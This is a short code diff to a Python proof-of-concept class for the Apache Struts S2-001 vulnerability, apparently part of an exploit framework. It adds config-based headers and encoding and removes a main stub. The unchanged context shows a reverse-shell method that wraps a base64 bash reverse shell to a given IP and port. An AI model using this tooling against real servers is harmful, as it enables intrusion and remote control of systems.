@@ -9,6 +9,7 @@ from poc.utils.httpUtils import *
 from poc.reverse_shell.base64_bash_reverse_shell import *
 from poc.utils.cmdUtils import *
 from urllib.parse import quote, unquote
+from config.config import getConfigMessage
 import random
 
 
@@ -31,6 +32,9 @@ class Struts001(BasePoc):
         else:
             self.data = data
         self.is_vul = False
+        self.encoding = encoding
+        self.config_message = getConfigMessage()
+        self.headers = self.config_message.headers
         if 'Content-Type' not in self.headers:
             self.headers['Content-Type'] = 'application/x-www-form-urlencoded'
 
@@ -85,6 +89,3 @@ class Struts001(BasePoc):
         """反弹shell"""
         html = base64_bash_reverse_shell(self, ip, port, self.exec_cmd)
         return html
-
-if __name__ == "__main__":
-    struts001 =  Struts001()
